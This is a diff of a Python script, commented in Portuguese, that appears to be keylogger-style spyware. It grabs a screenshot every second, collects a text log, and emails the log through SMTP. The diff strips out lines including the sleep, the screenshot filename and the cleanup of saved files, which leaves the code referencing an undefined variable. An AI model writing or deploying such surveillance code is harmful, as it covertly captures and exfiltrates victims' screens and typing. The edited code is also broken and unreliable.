@@ -12,14 +12,12 @@ import os
 
 fullog = ''
 words = ''
-email_char_limit = 30
 
 # Lista para armazenar os nomes dos arquivos de screenshot
 screenshot_files = []
 
 # Dicionário de substituição para caracteres acentuados
 substitutions = {
-    "39": "á"
 }
 
 
@@ -63,9 +61,7 @@ def replace_characters(text):
 
 def capture_screenshot():
     while True:
-        time.sleep(1)
         screenshot = ImageGrab.grab()
-        filename = f"screenshot_{int(time.time())}.png"
         screenshot.save(filename)
         screenshot_files.append(filename)
 
@@ -100,10 +96,6 @@ def send_log():
         s.quit()
         print('Email enviado')
 
-        # Clear the screenshot files list and delete the files
-        for filename in screenshot_files:
-            os.remove(filename)
-        screenshot_files.clear()
 
     except Exception as e:
         print(f"Erro ao enviar email: {e}")
